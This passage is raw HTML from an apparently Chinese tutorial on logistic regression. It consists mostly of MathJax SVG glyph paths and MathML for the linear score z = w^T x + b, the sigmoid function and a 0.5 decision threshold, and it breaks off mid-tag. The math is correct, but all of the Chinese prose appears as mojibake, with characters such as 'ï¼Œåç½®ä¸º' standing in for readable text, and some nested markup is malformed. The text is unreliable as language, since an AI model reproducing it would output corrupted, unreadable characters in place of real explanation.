scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(5192.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(5637,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6081.7,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6526.3,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6971,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(7415.7,0)"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(749,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(8638.9,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow data-mjx-texclass="ORD"><mi mathvariant="bold">w</mi></mrow><mo>=</mo><mo stretchy="false">[</mo><msub><mi>w</mi><mn>1</mn></msub><mo>,</mo><msub><mi>w</mi><mn>2</mn></msub><mo>,</mo><mo>.</mo><mo>.</mo><mo>.</mo><mo>,</mo><msub><mi>w</mi><mi>n</mi></msub><mo stretchy="false">]</mo></math></mjx-assistive-mml></mjx-container>ï¼Œåç½®ä¸º <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.971ex" height="1.595ex" role="img" focusable="false" viewbox="0 -694 429 705" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>b</mi></math></mjx-assistive-mml></mjx-container>ï¼Œåˆ™æ¨¡å‹è®¡ç®—æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>çº¿æ€§éƒ¨åˆ†</li></ol><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="12.373ex" height="2.203ex" role="img" focusable="false" viewbox="0 -891.7 5468.8 973.7" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(742.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(1798.6,0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D430" d="M624 444Q636 441 722 441Q797 441 800 444H805V382H741L593 11Q592 10 590 8T586 4T584 2T581 0T579 -2T575 -3T571 -3T567 -4T561 -4T553 -4H542Q525 -4 518 6T490 70Q474 110 463 137L415 257L367 137Q357 111 341 72Q320 17 313 7T289 -4H277Q259 -4 253 -2T238 11L90 382H25V444H32Q47 441 140 441Q243 441 261 444H270V382H222L310 164L382 342L366 382H303V444H310Q322 441 407 441Q508 441 523 444H531V382H506Q481 382 481 380Q482 376 529 259T577 142L674 382H617V444H624Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mi" transform="translate(864,413) scale(0.707)"><path data-c="1D447" d="M40 437Q21 437 21 445Q21 450 37 501T71 602L88 651Q93 669 101 677H569H659Q691 677 697 676T704 667Q704 661 687 553T668 444Q668 437 649 437Q640 437 637 437T631 442L629 445Q629 451 635 490T641 551Q641 586 628 604T573 629Q568 630 515 631Q469 631 457 630T439 622Q438 621 368 343T298 60Q298 48 386 46Q418 46 427 45T436 36Q436 31 433 22Q429 4 424 1L422 0Q419 0 415 0Q410 0 363 1T228 2Q99 2 64 0H49Q43 6 43 9T45 27Q49 40 55 46H83H94Q174 46 189 55Q190 56 191 56Q196 59 201 76T241 233Q258 301 269 344Q339 619 339 625Q339 630 310 630H279Q212 630 191 624Q146 614 121 583T67 467Q60 445 57 441T43 437H40Z" style="stroke-width: 3;"/></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(3210.4,0)"><g data-mml-node="mi"><path data-c="1D431" d="M227 0Q212 3 121 3Q40 3 28 0H21V62H117L245 213L109 382H26V444H34Q49 441 143 441Q247 441 265 444H274V382H246L281 339Q315 297 316 297Q320 297 354 341L389 382H352V444H360Q375 441 466 441Q547 441 559 444H566V382H471L355 246L504 63L545 62H586V0H578Q563 3 469 3Q365 3 347 0H338V62H366Q366 63 326 112T285 163L198 63L217 62H235V0H227Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(4039.6,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(5039.8,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>z</mi><mo>=</mo><msup><mrow data-mjx-texclass="ORD"><mi mathvariant="bold">w</mi></mrow><mi>T</mi></msup><mrow data-mjx-texclass="ORD"><mi mathvariant="bold">x</mi></mrow><mo>+</mo><mi>b</mi></math></mjx-assistive-mml></mjx-container><ol start="2"><li>æ¿€æ´»ï¼ˆéçº¿æ€§ï¼‰éƒ¨åˆ†ï¼Œç”¨ sigmoid å‡½æ•°å°†ç»“æœå‹ç¼©æˆæ¦‚ç‡ï¼š</li></ol><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -1.738ex;" xmlns="http://www.w3.org/2000/svg" width="19.37ex" height="4.774ex" role="img" focusable="false" viewbox="0 -1342 8561.5 2110" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1823.6,0)"><path data-c="1D70E" d="M184 -11Q116 -11 74 34T31 147Q31 247 104 333T274 430Q275 431 414 431H552Q553 430 555 429T559 427T562 425T565 422T567 420T569 416T570 412T571 407T572 401Q572 357 507 357Q500 357 490 357T476 358H416L421 348Q439 310 439 263Q439 153 359 71T184 -11ZM361 278Q361 358 276 358Q152 358 115 184Q114 180 114 178Q106 141 106 117Q106 67 131 47T188 26Q242 26 287 73Q316 103 334 153T356 233T361 278Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2394.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(2783.6,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3248.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3915.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mfrac" transform="translate(4971.1,0)"><g data-mml-node="mn" transform="translate(1545.2,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mrow" transform="translate(220,-686)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(722.2,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(1722.4,0)"><g data-mml-node="mi"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(499,289) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(778,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g></g></g></g><rect width="3350.4" height="60" x="120" y="220"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo stretchy="false">^</mo></mover></mrow><mo>=</mo><mi>Ïƒ</mi><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><msup><mi>e</mi><mrow data-mjx-texclass="ORD"><mo>âˆ’</mo><mi>z</mi></mrow></msup></mrow></mfrac></math></mjx-assistive-mml></mjx-container><ol start="3"><li>åˆ†ç±»å†³ç­–ï¼š</li></ol><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="40.178ex" height="2.296ex" role="img" focusable="false" viewbox="0 -810 17758.7 1015" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="2C6" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="2265" d="M83 616Q83 624 89 630T99 636Q107 636 253 568T543 431T687 361Q694 356 694 346T687 331Q685 329 395 192L107 56H101Q83 58 83 76Q83 77 83 79Q82 86 98 95Q117 105 248 167Q326 204 378 228L626 346L360 472Q291 505 200 548Q112 589 98 597T83 616ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1823.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" style="stroke-width: 3;"/><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)" style="stroke-width: 3;"/><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(778,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3379.3,0)"><path data-c="21D2" d="M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(4657.1,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">é¢„</text></g><g data-mml-node="mi" transform="translate(5657.1,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">æµ‹</text></g><g data-mml-node="mi" transform="translate(6657.1,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">ä¸º</text></g><g data-mml-node="mn" transform="translate(7657.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(8157.1,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">ç±»</text></g><g data-mml-node="mspace" transform="translate(9157.1,0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(9157.1,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="2C6" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mtext" transform="translate(9647.1,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(10425.1,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" style="stroke-width: 3;"/><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)" style="stroke-width: 3;"/><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(778,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(11980.9,0)"><path data-c="21D2" d="M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(13258.7,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">é¢„</text></g><g data-mml-node="mi" transform="translate(14258.7,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">æµ‹</text></g><g data-mml-node="mi" transform="translate(15258.7,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">ä¸º</text></g><g data-mml-node="mn" transform="translate(16258.7,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" style="stroke-width: 3;"/></g><g 